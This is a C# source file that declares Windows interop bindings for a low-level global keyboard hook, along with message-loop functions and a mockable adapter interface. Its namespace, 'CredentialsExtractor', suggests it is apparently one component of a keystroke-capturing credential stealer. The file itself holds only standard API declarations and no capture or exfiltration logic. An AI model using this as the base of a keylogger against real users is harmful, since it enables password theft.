// INativeMethods.cs
using System.Runtime.InteropServices;

namespace CredentialsExtractor.Native
{
    // Interface provides abstraction over Windows API functions
    // Allows for potential mocking in tests
    public interface INativeMethods
    {
        IntPtr SetWindowsHookEx(int idHook, NativeMethods.LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        bool UnhookWindowsHookEx(IntPtr hhk);
        IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        IntPtr GetModuleHandle(string lpModuleName);
        short GetKeyState(int nVirtKey);
        bool GetMessage(out NativeMethods.MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
        bool TranslateMessage(ref NativeMethods.MSG lpMsg);
        IntPtr DispatchMessage(ref NativeMethods.MSG lpMsg);
    }

    // Implementation still provides static methods for convenience
    // but the interface allows for better testability
    public static class NativeMethods
    {
        // Constants
        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;
        public const int WM_KEYUP = 0x0101;
        public const int WM_SYSKEYDOWN = 0x0104;
        public const int WM_SYSKEYUP = 0x0105;

        // This function is used to establish a hook that monitors keyboard messages
        // before they are processed by the target window's message loop.
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        // This function must be called to clean up resources when the hook is no longer needed
        // or when the application exits.
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        // This function is important to call in hook procedures to maintain the hook chain
        // and allow other applications to receive the hook notifications.
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        // I typically use this to get the handle of the current process module
        // when setting up the keyboard hook.
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        // Useful for determining if modifier keys (Shift, Ctrl, Alt) are currently pressed.
        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        // Used in message loops to retrieve window messages, including keyboard events.
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        // Part of the standard Windows message loop processing alongside GetMessage and DispatchMessage.
        [DllImport("user32.dll")]
        public static extern bool TranslateMessage([In] ref MSG lpMsg);

        // Final step in message processing after GetMessage and TranslateMessage.
        [DllImport("user32.dll")]
        public static extern IntPtr DispatchMessage([In] ref MSG lpMsg);

        // Structure containing message information
        [StructLayout(LayoutKind.Sequential)]
        public struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public System.Drawing.Point pt;
        }

        // Structure containing information about a keyboard input event
        [StructLayout(LayoutKind.Sequential)]
        public struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;

            // (bit 0: extended key, bit 4: ALT key, bit 5: key was previously down, bit 7: key is being released)
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        // This delegate defines the signature for the callback function that receives
        // notifications from the low-level keyboard hook.
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    }

    // Adapter implementation that wraps the static methods
    public class NativeMethodsAdapter : INativeMethods
    {
        public IntPtr SetWindowsHookEx(int idHook, NativeMethods.LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId)
        {
            return NativeMethods.SetWindowsHookEx(idHook, lpfn, hMod, dwThreadId);
        }

        public bool UnhookWindowsHookEx(IntPtr hhk)
        {
            return NativeMethods.UnhookWindowsHookEx(hhk);
        }

        public IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam)
        {
            return NativeMethods.CallNextHookEx(hhk, nCode, wParam, lParam);
        }

        public IntPtr GetModuleHandle(string lpModuleName)
        {
            return NativeMethods.GetModuleHandle(lpModuleName);
        }

        public short GetKeyState(int nVirtKey)
        {
            return NativeMethods.GetKeyState(nVirtKey);
        }

        public bool GetMessage(out NativeMethods.MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax)
        {
            return NativeMethods.GetMessage(out lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
        }

        public bool TranslateMessage(ref NativeMethods.MSG lpMsg)
        {
            return NativeMethods.TranslateMessage(ref lpMsg);
        }

        public IntPtr DispatchMessage(ref NativeMethods.MSG lpMsg)
        {
            return NativeMethods.DispatchMessage(ref lpMsg);
        }
    }
}